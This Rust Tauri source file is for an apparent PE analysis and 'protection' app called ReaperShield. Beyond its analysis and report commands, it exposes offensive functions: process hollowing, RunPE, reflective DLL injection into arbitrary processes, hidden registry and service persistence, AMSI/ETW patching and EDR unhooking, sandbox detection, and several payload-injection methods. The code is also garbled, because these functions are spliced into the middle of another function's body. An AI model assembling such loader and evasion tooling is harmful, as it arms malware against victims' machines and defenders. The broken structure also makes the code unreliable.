// Prevents additional console window on Windows in release
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use reapershield_analyzer::{PeAnalyzer, PeReport};
use reapershield_sdk::{ProtectionPipelineConfig, ProtectionSummary, ReaperShieldSdk};
use reapershield_visualization::{BinaryVisuals, VisualizationEngine};
use reapershield_reports::{AuditReport, ReportGenerator};
use reapershield_telemetry::{TelemetryManager, TelemetryRecord};
use reapershield_evasion::{
    ProcessHollower, ReflectiveLoader, PersistenceEngine, AvEdrBypass,
    SandboxEvasion, InjectionFramework,
    RunPeConfig, ReflectiveLoaderConfig, PersistenceConfig, PersistenceTechnique,
    BypassConfig, EvasionConfig, InjectionConfig, InjectionMethod,
};

use std::fs::File;
use std::io::Read;
use std::path::{Path, PathBuf};

#[tauri::command]
fn tauri_analyze_file(path: String) -> Result<PeReport, String> {
    let path_ref = Path::new(&path);
    if !path_ref.exists() {
        return Err("Target file does not exist.".to_string());
    }

    PeAnalyzer::analyze_file(path_ref)
        .map_err(|e| format!("Analysis failed: {}", e))
}

#[tauri::command]
async fn tauri_open_file_dialog() -> Result<String, String> {
    Ok("File dialog not implemented".to_string())
}

#[tauri::command]
fn tauri_get_visuals(path: String) -> Result<BinaryVisuals, String> {
    let path_ref = Path::new(&path);
    if !path_ref.exists() {
        return Err("Target file does not exist.".to_string());
    }

    let report = PeAnalyzer::analyze_file(path_ref)
        .map_err(|e| format!("Analysis failed: {}", e))?;

    let buffer = std::fs::read(path_ref)
        .map_err(|e| format!("Failed to read file: {}", e))?;

    let visuals = VisualizationEngine::generate_visuals(&buffer, &report);
    Ok(visuals)
}

#[tauri::command]
fn tauri_protect_binary(
    input_path: String,
    output_path: String,
    config: ProtectionPipelineConfig,
    passphrase: Option<String>,
) -> Result<ProtectionSummary, String> {
    let input_path_ref = Path::new(&input_path);
    let output_path_ref = Path::new(&output_path);

    if !input_path_ref.exists() {
        return Err("Input file does not exist.".to_string());
    }

    let pass_bytes = passphrase.as_ref().map(|p| p.as_bytes());

    ReaperShieldSdk::protect_binary(
        input_path_ref,
        output_path_ref,
        &config,
        pass_bytes,
    )
    .map_err(|e| format!("Protection pipeline failed: {}", e))
}

#[tauri::command]
fn tauri_generate_report(path: String, out_dir: Option<String>) -> Result<String, String> {
    let file = Path::new(&path);
    if !file.exists() {
        return Err("Target file does not exist.".to_string());
    }

    let report = PeAnalyzer::analyze_file(file)
        .map_err(|e| format!("Analysis failed: {}", e))?;

    let target_directory = out_dir
        .map(|s| PathBuf::from(s))
        .unwrap_or_else(|| file.parent().unwrap_or(Path::new(".")).to_path_buf());

    let file_stem = file.file_stem().unwrap_or_default().to_string_lossy();
    let telemetry_log_name = format!("{}_audit.log", file.file_name().unwrap_or_default().to_string_lossy());
    let telemetry_path = file
        .parent()
        .unwrap_or(Path::new("."))
        .join(telemetry_log_name);
    let telemetry_events = TelemetryManager::new(Some(telemetry_path))
        .read_logs()
        .unwrap_or_default();

    let audit_report = AuditReport {
        report_id: uuid::Uuid::new_v4().to_string()[..8].to_uppercase(),
        created_at: chrono::Utc::now(),
        binary_report: report,
        telemetry_events,
        protection_applied: false,
        compression_ratio: None,
    };

    let html_path = target_directory.join(format!("{}_audit_report.html", file_stem));
    ReportGenerator::generate_html_report(&audit_report, &html_path)
        .map_err(|e| format!("Report compilation failed: {}", e))?;

    Ok(html_path.to_string_lossy().into_owned())
}

#[tauri::command]
fn tauri_get_telemetry(path: String) -> Result<Vec<TelemetryRecord>, String> {
    let file = Path::new(&path);
    if !file.exists() {
        return Err("Target file does not exist.".to_string());
    }

    let telemetry_log_name = format!("{}_audit.log", file.file_name().unwrap_or_default().to_string_lossy());
    let telemetry_path = file
        .parent()
        .unwrap_or(Path::new("."))
        .join(telemetry_log_name);
#[tauri::command]
fn tauri_hollow_process(target_exe: String, payload_path: String) -> Result<String, String> {
    let payload = std::fs::read(&payload_path)
        .map_err(|e| format!("Failed to read payload: {}", e))?;

    ProcessHollower::hollow(&target_exe, &payload)
        .map(|r| serde_json::to_string(&r).unwrap())
        .map_err(|e| e.to_string())
}

#[tauri::command]
fn tauri_runpe(target_exe: String, payload_path: String) -> Result<String, String> {
    let payload = std::fs::read(&payload_path)
        .map_err(|e| format!("Failed to read payload: {}", e))?;

    let config = RunPeConfig {
        target_exe: target_exe.clone(),
        payload_path: payload_path.clone(),
        create_suspended: true,
        unpatch_ntdll: true,
        randomize_dll_name: false,
    };

    ProcessHollower::runpe(&config, &payload)
        .map(|r| serde_json::to_string(&r).unwrap())
        .map_err(|e| e.to_string())
}

#[tauri::command]
fn tauri_reflective_load(payload_path: String) -> Result<String, String> {
    let payload = std::fs::read(&payload_path)
        .map_err(|e| format!("Failed to read payload: {}", e))?;

    let config = ReflectiveLoaderConfig {
        resolve_imports: true,
        apply_relocations: true,
        call_entry_point: true,
        entry_point_arg: None,
        wipe_headers: true,
        erase_pe_signature: false,
    };

    ReflectiveLoader::load(&payload, &config)
        .map(|r| serde_json::to_string(&r).unwrap())
        .map_err(|e| e.to_string())
}

#[tauri::command]
fn tauri_reflective_dll_inject(pid: u32, dll_path: String) -> Result<String, String> {
    let dll_data = std::fs::read(&dll_path)
        .map_err(|e| format!("Failed to read DLL: {}", e))?;

    ReflectiveLoader::reflective_dll_inject(pid, &dll_data)
        .map(|r| serde_json::to_string(&r).unwrap())
        .map_err(|e| e.to_string())
}

#[tauri::command]
fn tauri_add_persistence(target_path: String, artifact_name: String, technique: String) -> Result<String, String> {
    let tech = match technique.as_str() {
        "registry_run" => PersistenceTechnique::RegistryRun,
        "registry_runonce" => PersistenceTechnique::RegistryRunOnce,
        "startup_folder" => PersistenceTechnique::StartupFolder,
        "windows_service" => PersistenceTechnique::WindowsService,
        _ => return Err("Unknown persistence technique".to_string()),
    };

    let config = PersistenceConfig {
        technique: tech,
        target_path: target_path.clone(),
        artifact_name,
        execute_on: "logon".to_string(),
        hidden: true,
    };

    PersistenceEngine::apply(&config)
        .map(|r| serde_json::to_string(&r).unwrap())
        .map_err(|e| e.to_string())
}

#[tauri::command]
fn tauri_av_edr_bypass(unhook_ntdll: bool, patch_amsi: bool, patch_etw: bool) -> Result<String, String> {
    let config = BypassConfig {
        unhook_ntdll,
        unhook_kernel32: false,
        patch_amsi,
        patch_etw,
        use_syscall_stub: true,
        indirect_syscalls: false,
    };

    AvEdrBypass::apply_bypasses(&config)
        .map(|r| serde_json::to_string(&r).unwrap())
        .map_err(|e| e.to_string())
}

#[tauri::command]
fn tauri_detect_sandbox() -> Result<String, String> {
    let config = EvasionConfig {
        check_cpu_count: true,
        check_memory: true,
        check_disk_size: true,
        check_registry_keys: true,
        check_mac_address: false,
        check_mouse_movement: false,
        check_sleep_acceleration: true,
    };

    SandboxEvasion::detect_sandbox(&config)
        .map(|r| serde_json::to_string(&r).unwrap())
        .map_err(|e| e.to_string())
}

#[tauri::command]
fn tauri_inject_payload(pid: u32, payload_path: String, method: String) -> Result<String, String> {
    let payload = std::fs::read(&payload_path)
        .map_err(|e| format!("Failed to read payload: {}", e))?;

    let inj_method = match method.as_str() {
        "classic_dll" => InjectionMethod::ClassicDllInjection,
        "apc" => InjectionMethod::ApcInjection,
        "thread_hijacking" => InjectionMethod::ThreadHijacking,
        "process_doppelganging" => InjectionMethod::ProcessDoppelganging,
        _ => return Err("Unknown injection method".to_string()),
    };

    let config = InjectionConfig {
        target_pid: pid,
        payload,
        method: inj_method,
        execute: true,
    };

    InjectionFramework::inject(&config)
        .map(|r| serde_json::to_string(&r).unwrap())
        .map_err(|e| e.to_string())
}


    TelemetryManager::new(Some(telemetry_path))
        .read_logs()
        .map_err(|e| format!("Failed to read telemetry log: {}", e))
}

fn main() {
    tauri::Builder::default()
        .invoke_handler(tauri::generate_handler![
            tauri_analyze_file,
            tauri_get_visuals,
            tauri_protect_binary,
            tauri_generate_report,
            tauri_get_telemetry
        ])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
